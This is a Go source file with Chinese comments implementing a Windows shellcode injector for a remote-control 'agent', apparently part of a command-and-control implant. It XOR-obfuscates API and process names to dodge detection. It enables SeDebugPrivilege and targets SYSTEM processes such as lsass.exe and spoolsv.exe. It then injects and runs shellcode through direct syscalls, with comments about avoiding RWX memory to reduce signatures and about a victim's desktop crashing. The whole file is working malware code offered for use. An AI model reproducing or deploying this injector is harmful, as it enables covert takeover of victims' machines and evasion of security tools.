//go:build windows
// +build windows

//进程注入存在问题，执行命令会导致受害者桌面崩溃，貌似是因为agent.exe太大
//注释掉了winlogon.exe，添加了spoolsv.exe，目前测试不再崩溃
//对敏感字符串（注入目标进程）进行了简单的异或加密处理

package inject

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32           = syscall.NewLazyDLL(xorDecrypt([]byte{0x1c, 0x12, 0x05, 0x19, 0x12, 0x1b, 0x44, 0x45, 0x59, 0x13, 0x1b, 0x1b}))                                   // kernel32.dll
	ntdll              = syscall.NewLazyDLL(xorDecrypt([]byte{0x19, 0x03, 0x13, 0x1b, 0x1b, 0x59, 0x13, 0x1b, 0x1b}))                                                     // ntdll.dll
	VirtualAllocEx     = kernel32.NewProc(xorDecrypt([]byte{0x21, 0x1e, 0x05, 0x03, 0x02, 0x16, 0x1b, 0x36, 0x1b, 0x1b, 0x18, 0x14, 0x32, 0x0f}))                         // VirtualAllocEx
	WriteProcessMemory = kernel32.NewProc(xorDecrypt([]byte{0x20, 0x05, 0x1e, 0x03, 0x12, 0x27, 0x05, 0x18, 0x14, 0x12, 0x04, 0x04, 0x3a, 0x12, 0x1a, 0x18, 0x05, 0x0e})) // WriteProcessMemory
	CreateRemoteThread = kernel32.NewProc(xorDecrypt([]byte{0x34, 0x05, 0x12, 0x16, 0x03, 0x12, 0x25, 0x12, 0x1a, 0x18, 0x03, 0x12, 0x23, 0x1f, 0x05, 0x12, 0x16, 0x13})) // CreateRemoteThread
	RtlMoveMemory      = ntdll.NewProc(xorDecrypt([]byte{0x25, 0x03, 0x1b, 0x3a, 0x18, 0x01, 0x12, 0x3a, 0x12, 0x1a, 0x18, 0x05, 0x0e}))                                  // RtlMoveMemory
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE_READ      = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
	PROCESS_ALL_ACCESS     = 0x1F0FFF
)

// Execute 将 Shellcode 注入到目标进程并执行
func Execute(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode 为空")
	}

	fmt.Printf("[+] 载荷已就绪: %d 字节\n", len(shellcode))

	// 0. 提升进程权限，启用 SeDebugPrivilege（关键：允许注入 SYSTEM 进程）
	if err := enableSeDebugPrivilege(); err != nil {
		fmt.Printf("[-] 警告：无法启用调试权限: %v\n", err)
		fmt.Println("[*] 将只能注入用户级进程")
	} else {
		fmt.Println("[+] SeDebugPrivilege 已启用，可注入 SYSTEM 进程")
	}

	// 1. 选择目标进程
	targetPID, targetName := findTargetProcess()
	if targetPID == 0 {
		return fmt.Errorf("未找到合适的注入目标")
	}
	fmt.Printf("[+] 选择注入目标: %s (PID: %d)\n", targetName, targetPID)

	// 验证目标进程的权限级别
	privilegeLevel := getProcessPrivilegeLevel(targetPID)
	fmt.Printf("[+] 目标进程权限级别: %s\n", privilegeLevel)

	// 2. 打开目标进程
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, targetPID)
	if err != nil {
		return fmt.Errorf("无法打开目标进程: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	fmt.Println("[+] 目标进程已打开")

	// 初始化 Syscall Stub (Direct Syscall 准备)
	sys := &SyscallStub{}
	if err := sys.Init(); err != nil {
		return fmt.Errorf("Syscall初始化失败(可能被Hook严重无法绕过): %v", err)
	}

	// 3. 在目标进程中申请内存 (NtAllocateVirtualMemory)
	var baseAddr uintptr
	regionSize := uintptr(len(shellcode))

	status := sys.NtAllocateVirtualMemory(
		uintptr(hProcess),
		&baseAddr,
		0,
		&regionSize,
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)

	if status != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory 失败, status: 0x%x", status)
	}
	fmt.Printf("[+] 目标进程内存申请成功(Syscall): 0x%x\n", baseAddr)

	// 4. 写入 Shellcode 到目标进程 (NtWriteVirtualMemory)
	var bytesWritten uintptr
	status = sys.NtWriteVirtualMemory(
		uintptr(hProcess),
		baseAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		&bytesWritten,
	)

	if status != 0 {
		return fmt.Errorf("NtWriteVirtualMemory 失败, status: 0x%x", status)
	}
	fmt.Printf("[+] Payload 已写入目标进程(Syscall): %d 字节\n", bytesWritten)

	// *. 修改内存权限为 RX (NtProtectVirtualMemory)
	// 避免直接申请 RWX 内存，减少特征
	var oldProtect uintptr
	protectSize := uintptr(len(shellcode))
	status = sys.NtProtectVirtualMemory(
		uintptr(hProcess),
		&baseAddr,
		&protectSize, // 注意：NtProtectVirtualMemory 可能会修改这个值
		PAGE_EXECUTE_READ,
		&oldProtect,
	)

	if status != 0 {
		return fmt.Errorf("NtProtectVirtualMemory 失败, status: 0x%x", status)
	}
	fmt.Printf("[+] 内存权限已修改为 RX (Syscall)\n")

	// 5. 在目标进程创建远程线程执行 (NtCreateThreadEx)
	var hThread uintptr
	status = sys.NtCreateThreadEx(
		&hThread,
		0x1FFFFF, // ALL_ACCESS
		0,
		uintptr(hProcess),
		baseAddr,
		0,
		0,
		0, 0, 0, 0,
	)

	if status != 0 {
		return fmt.Errorf("NtCreateThreadEx 失败, status: 0x%x", status)
	}
	windows.CloseHandle(windows.Handle(hThread))
	fmt.Printf("[+] 远程线程已创建(Syscall)，Agent 已注入到 %s\n", targetName)
	fmt.Println("[+] Loader 任务完成，即将退出...")

	// 不等待线程执行，让 Loader 直接退出
	// Agent 会在目标进程中持续运行
	return nil
}

// findTargetProcess 寻找合适的注入目标进程
func findTargetProcess() (uint32, string) {
	// 优先级列表：优先选择高权限进程
	targets := []string{
		// SYSTEM 权限进程
		xorDecrypt([]byte{0x04, 0x07, 0x18, 0x18, 0x1b, 0x04, 0x01, 0x59, 0x12, 0x0f, 0x12}),       // spoolsv.exe
		xorDecrypt([]byte{0x04, 0x12, 0x05, 0x01, 0x1e, 0x14, 0x12, 0x04, 0x59, 0x12, 0x0f, 0x12}), // services.exe
		xorDecrypt([]byte{0x1b, 0x04, 0x16, 0x04, 0x04, 0x59, 0x12, 0x0f, 0x12}),                   // lsass.exe

		// 用户进程
		xorDecrypt([]byte{0x12, 0x0f, 0x07, 0x1b, 0x18, 0x05, 0x12, 0x05, 0x59, 0x12, 0x0f, 0x12}),                               // explorer.exe
		xorDecrypt([]byte{0x04, 0x01, 0x14, 0x1f, 0x18, 0x04, 0x03, 0x59, 0x12, 0x0f, 0x12}),                                     // svchost.exe
		xorDecrypt([]byte{0x13, 0x1b, 0x1b, 0x1f, 0x18, 0x04, 0x03, 0x59, 0x12, 0x0f, 0x12}),                                     // dllhost.exe
		xorDecrypt([]byte{0x25, 0x02, 0x19, 0x03, 0x1e, 0x1a, 0x12, 0x35, 0x05, 0x18, 0x1c, 0x12, 0x05, 0x59, 0x12, 0x0f, 0x12}), // RuntimeBroker.exe
	}

	fmt.Println("[*] 扫描可注入进程...")
	for _, target := range targets {
		pid := findProcessByName(target)
		if pid != 0 {
			// 尝试打开进程验证是否有权限注入
			if canInject(pid) {
				fmt.Printf("[+] 找到可注入进程: %s (PID: %d)\n", target, pid)
				return pid, target
			} else {
				fmt.Printf("[-] 跳过: %s (PID: %d) - 权限不足\n", target, pid)
			}
		}
	}

	return 0, ""
}

// canInject 检查是否有权限注入到目标进程
func canInject(pid uint32) bool {
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		return false
	}
	windows.CloseHandle(hProcess)
	return true
}

// findProcessByName 通过进程名查找 PID
func findProcessByName(name string) uint32 {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	if err := windows.Process32First(snapshot, &entry); err != nil {
		return 0
	}

	for {
		processName := windows.UTF16ToString(entry.ExeFile[:])
		if processName == name {
			return entry.ProcessID
		}

		if err := windows.Process32Next(snapshot, &entry); err != nil {
			break
		}
	}

	return 0
}

// enableSeDebugPrivilege 启用 SeDebugPrivilege 特权
// 这允许进程打开和操作 SYSTEM 权限的进程（如 winlogon.exe, lsass.exe）
func enableSeDebugPrivilege() error {
	var token windows.Token

	// 打开当前进程的访问令牌
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("failed to open process token: %v", err)
	}
	defer token.Close()

	// 查找 SeDebugPrivilege 的 LUID
	var luid windows.LUID
	privName := xorDecrypt([]byte{0x24, 0x12, 0x33, 0x12, 0x15, 0x02, 0x10, 0x27, 0x05, 0x1e, 0x01, 0x1e, 0x1b, 0x12, 0x10, 0x12})
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(privName), &luid)
	if err != nil {
		return fmt.Errorf("failed to lookup privilege: %v", err)
	}

	// 构造特权结构
	privileges := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_ENABLED,
			},
		},
	}

	// 调整令牌特权
	err = windows.AdjustTokenPrivileges(token, false, &privileges, 0, nil, nil)
	if err != nil {
		return fmt.Errorf("failed to adjust token privileges: %v", err)
	}

	return nil
}

// getProcessPrivilegeLevel 获取进程的权限级别
func getProcessPrivilegeLevel(pid uint32) string {
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return "Unknown (无法查询)"
	}
	defer windows.CloseHandle(hProcess)

	var token windows.Token
	err = windows.OpenProcessToken(hProcess, windows.TOKEN_QUERY, &token)
	if err != nil {
		return "Unknown (无法获取令牌)"
	}
	defer token.Close()

	// 获取令牌的用户 SID
	tokenUser, err := token.GetTokenUser()
	if err != nil {
		return "Unknown (无法获取用户)"
	}

	// 检查是否是 SYSTEM 用户
	systemSid, err := windows.CreateWellKnownSid(windows.WinLocalSystemSid)
	if err == nil && tokenUser.User.Sid.Equals(systemSid) {
		return "SYSTEM (最高权限)"
	}

	// 检查是否是管理员组成员
	adminSid, err := windows.CreateWellKnownSid(windows.WinBuiltinAdministratorsSid)
	if err == nil {
		isMember, err := token.IsMember(adminSid)
		if err == nil && isMember {
			return "Administrator (管理员)"
		}
	}

	return "User (普通用户)"
}

// xorDecrypt 简单的 XOR 解密函数
func xorDecrypt(data []byte) string {
	key := byte(0x77)
	decrypted := make([]byte, len(data))
	for i, b := range data {
		decrypted[i] = b ^ key
	}
	return string(decrypted)
}
